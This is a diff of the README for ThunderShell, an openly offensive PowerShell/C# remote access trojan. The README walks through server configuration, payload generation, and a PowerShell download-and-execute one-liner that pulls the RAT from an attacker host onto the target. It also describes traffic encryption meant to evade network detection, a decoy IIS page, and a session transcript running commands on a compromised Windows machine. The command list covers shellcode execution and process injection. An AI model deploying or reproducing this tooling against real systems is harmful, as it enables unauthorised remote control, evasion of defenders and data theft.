@@ -1,208 +1,695 @@
 # ThunderShell
 
-ThunderShell is a Powershell based RAT that rely on HTTP request to communicate. All the network traffic is encrypted using a second layer of RC4 to avoid SSL interception and defeat network detection on the targeted system. RC4 is a weak cipher and it's only use as obfuscation HTTPS options should be used to provide integrity and strong encryption.
 
-# Dependencies
+
+ThunderShell is a C# RAT that communicates via HTTP requests. All the network traffic is encrypted using a second layer of RC4 to avoid SSL interception and defeat network detection on the target system. RC4 is a weak cipher and is employed here to help obfuscate the traffic. HTTPS options should be used to provide integrity and strong encryption.
+
+# Current version
+
+Current release is 2.0.0
+
+
+# Installation
+
+
+
+Cloning the repository
+
+
 
 ```
+
+git clone https://github.com/Mr-Un1k0d3r/ThunderShell
+
+```
+
+
+
+ThunderShell itself uses Python2 and requires the following dependencies:.
+
+
+
+```
+
+apt install python
+
 apt install redis-server
+
 apt install mysql-server
+
 apt install python-redis
+
 apt install python-mysqldb
+
 apt install python-tabulate
-```
-
-# Logs
-Every errors, http requests and commands are logged in the logs folder.
-
-# How it works
-
-The powershell code is executed on the victim. The actual core is written in C#. and use rely on the unmanaged powershell approach to execute each commands. several commands can be run in parallel since the C# code using multi threading. The RAT support several command to speed up the process.
 
 ```
-Help Menu
-=========
-
-Commands    Args            Descriptions
-----------  --------------  ------------------------------------------------------------
-background                  Return to the main console
-fetch       path/url, cmd   In memory execution of a script and execute a command
-exec        path/url        In memory execution of code (shellcode)
-read        remote path     Read a file on the remote host
-upload      path/url, path  Upload a file on the remote system
-ps                          List processes
-powerless   powershell cmd  Execute Powershell command without invoking Powershell
-inject      pid, command    Inject command into a target process (max length 4096)
-alias       key, value      Create an alias to avoid typing the same thing over and over
-delay       milliseconds    Update the callback delay
-help                        show this help menu
 
 
-List of built in aliases
-------------------------
-wmiexec                     Remote-WmiExecute utility
-searchevent                 Search-EventForUser utility
-```
 
-* Fetch Command Flow
-
-```
-The server will fetch a resource (path, url) 
-        Send the data over the RC4 encrypted channel
-                The PowerShell RAT will decrypt the payload 
-                        Unmanaged PowerShell Execute the final payload
-```
-
-For example if you fetch PowerView.ps1 script it will be fully encrypted over the wire avoiding detection since the server is proxying the request and fully encrypt the data.
-
-# Usage
-
-## Victim
-`powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://ringzer0team.com/PS-RemoteShell.ps1');`
- - Make sure that the  `encryption-key` value in your JSON config file match the PowerShell PS-RemoteShell `-Key` option.
- - If you are using https on the ThunderShell server, add the `-Protocol https` attribute to the PowerShell  PS-RemoteShell launcher. 
+# ThunderShell features
 
 
-## Attacker
-### Configuration
 
-default.json:
-```
-{
-	"redis-host": "localhost",
-	"redis-port": 6379,
-
-	"mysql-host": "localhost",
-	"mysql-user": "root",
-	"mysql-pass": "",
-	"mysql-port": "3306",
-
-	"http-host": "1.1.1.1",
-	"http-port": 1111,
-	"http-server": "Microsoft-IIS/7.5",
-	"http-download-path": "cat.png",
-	"http-default-404": "default.html",
-
-	"https-enabled": "off",
-	"https-cert-path": "cert.pem",
-
-	"encryption-key": "PleaseChangeMe",
-	"max-output-timeout": 5,
-
-	"server-password": "PleaseChangeMe",
-
-	"aliases": {
-		"myalias": ""
-	},
-
-	"cli-sync-delay": 5
-}
-```
-
-### HTTPS configuration
-If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this structure:
-
-```
------BEGIN RSA PRIVATE KEY-----
-... (private key in base64 encoding) ...
------END RSA PRIVATE KEY-----
------BEGIN CERTIFICATE-----
-... (certificate in base64 PEM encoding) ...
------END CERTIFICATE-----
-```
 ### Payload delivery
 
-The `http-download-path` is used to deliver the PowerShell RAT code. It will perform variables renaming by default and will deliver the payload only if the path match the one defined by the `http-download-path` variable.
 
-In this example if the attacker browse to `http://1.1.1.1:8080/cat.png` the web server will return obfuscated version of the RAT:
 
-On your target you can execute the PowerShell script using the following command `IEX (New-Object Net.WebClient).DownloadString("http://1.1.1.1:8080/cat.png");`
+Currently ThunderShell only supports C# wrapped in PowerShell.
 
-### Splash page configuration
+Future release will include:
 
-You can customize the "error" page that is returned for every GET requests by specifying your HTML template through the `http-default-404` variable. The file need to be placed in the `html` folder and depencies such as images in the `download` folder. By default ThunderShell is mimicking an IIS server and return the default IIS server page.
 
-### Delivering files
 
-Everything that is placed in the `download` folder can be downloaded from the web server:
+* `powershell`
+
+* `C# exe`
+
+* `C# dll`
+
+
+
+### Multi users interface
+
+
+
+ThunderShell can be used through the CLI and the web interface (under development) and supports several users at the same time on both the web interface and the CLI.
+
+
+
+### Logging capabilities
+
+
+
+The tool provides typical web traffic and error logs. Commands for every active session are saved on disk for future reference. The log folder structure contains each shell output sorted by date.
+
+
+
+### Multithreading
+
+
+
+ThunderShell client supports threading, meaning you can execute several commands in parallel on your target. ThunderShell is handles this for you on both the client and the server.
+
+
+
+### Network traffic formating
+
+
+
+(under development) ThunderShell allows you to configure the network request performed by the client by setting arbitrary headers and changing the format of the data sent to the server.
+
+
+
+Example configuration file `profile.json`:
+
+
 
 ```
-/pathto/ThunderShell/download/payload.sct
 
-http://1.1.1.1:8080/payload.sct
+{
+
+	headers: {
+
+				"X-Powered-By": "ThunderShell",
+
+				"Cookie": "user={{random}}[16]"
+
+			}
+
+}
+
 ```
 
-### Launching the server
+
+
+The `{{random}}[size]` syntax can be used to set arbitrary values at runtime.
+
+
+
+The profile is loaded by the main configuration file shown below
+
+
+
+### ThunderShell client features
+
+
+
+The client is using a C# unmanaged approach to execute powershell code. This allows the user to execute arbitrary powershell commands directly on the shell, without invoking `powershell.exe`.
+
+
+
+# Setup ThunderShell
+
+
+
+### Configuration file
+
+
+
+First, the configuration file needs to be configured properly. Here is an example of a configuration file `default.json`:
+
+
+
 ```
-me@debian-dev:~$ python ThunderShell.py default.json Mr.Un1k0d3r
 
-Thunder Shell 2.0 | Clients Server CLI
-Mr.Un1k0d3r RingZer0 Team 2017
---------------------------------------------------------
+{
 
-[+] Current Active session UUID is 9e3fd04b-3db6-4ceb-9fc1-75fdee2d5ad4
+	"redis-host": "localhost",
+
+	"redis-port": 6379,
 
 
-[+] Starting web server on 1.1.1.1 port 1111
 
-[+] Registering new shell 10-R90G3RLC-1GG RingZer0\MrUn1k0d3r
-[+] New shell ID 10 GUID is mL3vWfauOgXL1sW0
+	"mysql-host": "localhost",
 
-(10-R90G3RLC-1GG RingZer0\MrUn1k0d3r)>>> whoami
+	"mysql-user": "root",
 
-(10-R90G3RLC-1GG RingZer0\MrUn1k0d3r)>>>
-[+] [(CLI)Mr.Un1k0d3r] Sending command: whoami
+	"mysql-pass": "",
 
-[*] Command output:
-RingZer0\MrUn1k0d3r
+	"mysql-port": "3306",
 
-(10-R90G3RLC-1GG RingZer0\MrUn1k0d3r)>>> help
+
+
+	"http-host": "1.1.1.1",
+
+	"http-port": 1111,
+
+	"http-server": "Microsoft-IIS/7.5",
+
+	"http-download-path": "cat.png",
+
+	"http-default-404": "default.html",
+
+
+
+	"https-enabled": "off",
+
+	"https-cert-path": "cert.pem",
+
+
+
+	"encryption-key": "",
+
+	"max-output-timeout": 5,
+
+
+
+	"server-password": "",
+
+
+
+	"aliases": {
+
+		"myalias": ""
+
+	},
+
+
+
+	"cli-sync-delay": 5,
+
+	
+
+	"http-profile": "profile.json"
+
+}
+
+``` 
+
+
+
+The `server-password` and `encryption-key` are generated automatically on the first run.
+
+
+
+### Starting the server
+
+
+
+The server, including the web interface, are started from the CLI:
+
+
+
+```
+
+$ python ThunderShell.py default.json MrUn1k0d3r -gui
+
+```
+
+
+
+`default.json` is the configuration file. `MrUn1k0d3r` is the username for the session. `-gui` launches the web interface.
+
+
+
+### HTTPS configuration
+
+If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this structure:
+
+
+
+```
+
+-----BEGIN RSA PRIVATE KEY-----
+
+... (private key in base64 encoding) ...
+
+-----END RSA PRIVATE KEY-----
+
+-----BEGIN CERTIFICATE-----
+
+... (certificate in base64 PEM encoding) ...
+
+-----END CERTIFICATE-----
+
+```
+
+ 
+
+### Generating a payload
+
+
+
+ThunderShell generates payloads through the web interface. The endpoint is defined by the `http-download-path` variable.
+
+
+
+Based on the configuration file, to generate a payload simply browse to:
+
+
+
+```
+
+http://1.1.1.1:1111/cat.png
+
+```
+
+
+
+The endpoint supports several options that can be added to the url http://1.1.1.1:1111/cat.png/`type`/`delay`/
+
+
+
+`type` supports only `ps` for now. `delay` is the amount of sleep (in milliseconds) between each callback. Its default value is `10000` (10 seconds).
+
+
+
+
+
+### Executing the code on the target
+
+
+
+There are several way of executing the RAT on the target. One simple example is to use powershell:
+
+
+
+```
+
+powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://1.1.1.1:1111/cat.png');
+
+```
+
+
+
+
+
+# The interface
+
+
+
+The example below executes Windows and Powershell commmands directly without invoking `powershell.exe`. The `fetch` command is used to obfuscate the powershell script. The server will download the data from the link specified, then encrypt it using the RC4 key and send it to the client. The client will then perform decryption and execute the code avoiding network detection.
+
+
+
+```
+
+python ThunderShell.py default.json MrUn1k0d3r -gui
+
+
+
+             .#"    =[ Thunder Shell| RingZer0 Team ]=
+
+           .##"
+
+        .###"       __       __    _________    __            __
+
+       ###P        ###|     ###|  ##########|  ###|          ###|
+
+     d########"    ###|     ###|  ###|         ###|          ###|
+
+     ****####"     ###|_____###|  ###|__       ###|          ###|
+
+       .###"       ############|  ######|      ###|          ###|
+
+      .##"         ###|     ###|  ###|         ###|          ###|
+
+     .#"           ###|     ###|  ###|______   ###|_______   ###|_______
+
+    ."             ###|     ###|  ##########|  ###########|  ###########|
+
+
+
+
+
+
+
+
+
+[-] install.lock not found
+
+[+] Current Active session UUID is c8ab130e-9ec1-40d5-a5de-cb7c0ec9698a
+
+
+
+
+
+[+] Starting web server on 192.168.17.129 port 8080
+
+
+
+(Main)>>> help
+
+
 
 Help Menu
+
 =========
 
+
+
+Commands    Args                                  Descriptions
+
+----------  ------------------------------------  --------------------------------------------------------------------------------------------
+
+list        full                                  List all active shells
+
+interact    id                                    Interact with a session
+
+show        (password,key,error,http,event) rows  Show server password, encryption key, errors, http or events log (default number of rows 10)
+
+kill        id                                    kill shell (clear db only)
+
+os          command                               Execute command on the system (local)
+
+purge       force                                 WARNING! Delete all the Redis DB
+
+exit                                              Exit the application
+
+help     
+
+
+
+(Main)>>>
+
+[+] Registering new shell DESKTOP-2JKIANV DESKTOP-2JKIANV\admin
+
+[+] New shell ID 12 GUID is nDCCYACFWYrU6LwM
+
+
+
+(Main)>>> interact 12
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> help
+
+
+
+Help Menu
+
+=========
+
+
+
 Commands    Args            Descriptions
+
 ----------  --------------  ------------------------------------------------------------
+
 background                  Return to the main console
-fetch       path/url, cmd   In memory execution of a script and execute a command
-exec        path/url        In memory execution of code (shellcode)
-read        remote path     Read a file on the remote host
-upload      path/url, path  Upload a file on the remote system
-ps                          List processes
-powerless   powershell cmd  Execute Powershell command without invoking Powershell
-inject      pid, command    Inject command into a target process (max length 4096)
-alias       key, value      Create an alias to avoid typing the same thing over and over
-delay       milliseconds    Update the callback delay
-help                        show this help menu
+
+fetch                       In memory execution of a script and execute a command
+
+exec        path/url, cmd   In memory execution of code (shellcode)
+
+read        path/url        Read a file on the remote host
+
+upload      remote path     Upload a file on the remote system
+
+ps          path/url, path  List processes
+
+powerless                   Execute Powershell command without invoking Powershell
+
+inject      powershell cmd  Inject command into a target process (max length 4096)
+
+alias       pid, command    Create an alias to avoid typing the same thing over and over
+
+delay       key, value      Update the callback delay
+
+help        milliseconds    show this help menu
+
+
+
 
 
 List of built in aliases
+
 ------------------------
+
 wmiexec                     Remote-WmiExecute utility
+
 searchevent                 Search-EventForUser utility
+
+
+
 
 
 List user defined aliases
+
 --------------------------
 
-(10-R90G3RLC-1GG RingZer0\MrUn1k0d3r)>>> background
-(Main)>>> list full
 
-List of active shells
----------------------
 
-  5     10-R90G3RLC-1GG RingZer0\MrUn1k0d3r MbDYqaoA6QhlMYRg last seen 06/12/2018 14:53:10
-  8     10-R90G3RLC-1GG RingZer0\MrUn1k0d3r coyJ4UNIhgJj08Yh last seen 06/12/2018 15:04:49
-  6     10-R90G3RLC-1GG RingZer0\MrUn1k0d3r 8jakdrGo3U6NA6eV last seen 06/12/2018 14:53:31
-  10    10-R90G3RLC-1GG RingZer0\MrUn1k0d3r mL3vWfauOgXL1sW0 last seen 08/12/2018 13:57:39
-  
-(Main)>>> interact 10 
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
 
-# Todo
 
-* Implement in memory protection using C#
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> whoami
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+[+] [(CLI)MrUn1k0d3r] Sending command: whoami
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+[*] Command output:
+
+desktop-2jkianv\admin
+
+
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> cmd.exe /c ver
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+[+] [(CLI)MrUn1k0d3r] Sending command: cmd.exe /c ver
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+[*] Command output:
+
+
+
+Microsoft Windows [Version 10.0.16299.431]
+
+
+
+
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> $psversiontable
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+[+] [(CLI)MrUn1k0d3r] Sending command: $psversiontable
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+[*] Command output:
+
+
+
+Name                           Value
+
+----                           -----
+
+PSVersion                      5.1.16299.431
+
+PSEdition                      Desktop
+
+PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
+
+BuildVersion                   10.0.16299.431
+
+CLRVersion                     4.0.30319.42000
+
+WSManStackVersion              3.0
+
+PSRemotingProtocolVersion      2.3
+
+SerializationVersion           1.1.0.1
+
+
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>> fetch https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-IEBookmarks.ps1 Get-IEBookmarks
+
+[+] Fetching https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-IEBookmarks.ps1
+
+[+] Executing Get-IEBookmarks
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+[+] [(CLI)MrUn1k0d3r] Sending command: function Get-IEBookmarks {
+
+        # Mr.Un1k0d3r - RingZer0 Team 2016
+
+        # Get IE bookmarks URL
+
+
+
+        BEGIN {
+
+                $path = [Environment]::GetFolderPath('Favorites')
+
+                Write-Output "[+] Bookmark are located in $($path)"
+
+        }
+
+
+
+        PROCESS {
+
+                Get-ChildItem -Recurse $path -Include "*.url" | ForEach {
+
+                                $data = Get-Content $_.fullname | Select-String -Pattern URL
+
+                                Write-Output $data
+
+                        }
+
+        }
+
+
+
+        END {
+
+                Write-Output "[+] Process completed..."
+
+        }
+
+}
+
+;Get-IEBookmarks
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+[*] Command output:
+
+[+] Bookmark are located in C:\Users\admin\Favorites
+
+
+
+URL=http://go.microsoft.com/fwlink/p/?LinkId=255142
+
+[+] Process completed...
+
+
+
+
+
+
+
+
+
+
+
+(DESKTOP-2JKIANV DESKTOP-2JKIANV\admin)>>>
+
+```
+
+
+
+
+
+### Splash page configuration
+
+
+
+You can customize the "error" page that is returned for each GET request by specifying your HTML template through the `http-default-404` variable. The file needs to be placed in the `html` folder and dependencies (such as images) in the `download` folder. By default ThunderShell mimicks an IIS server and returns the default IIS server page.
+
+
+
+### Delivering arbitrary files
+
+
+
+Everything that is placed in the `download` folder can be downloaded from the web server. For example, `/root/ThunderShell/download/evil.exe` can be is available at: `http://1.1.1.1:1111/evil.exe`
+
+```
+
+# Release note
+
+### Version 1
+
+Initial release
+
+### Version 2.0 (10/12/2018)
+
+```
+code rewrite from powershell to C# to add flexibility
+multi threads and multiple shell now sync
+```
+
+# Upcoming features
+
+
+
+* Implement in-memory protection using C# and push / pull code there to avoid sending the data several times
+
 * Implement different delivery methods
+
 * Inject the PowerShell RAT into another process
 
+* Fully integrated keylogger
+
+
+
 # Credit 
-Mr.Un1k0d3r RingZer0 Team 2017
+
+Mr.Un1k0d3r @MrUn1k0d3r
+
+Tazz0 @Tazz019
+
+RingZer0 Team 2017
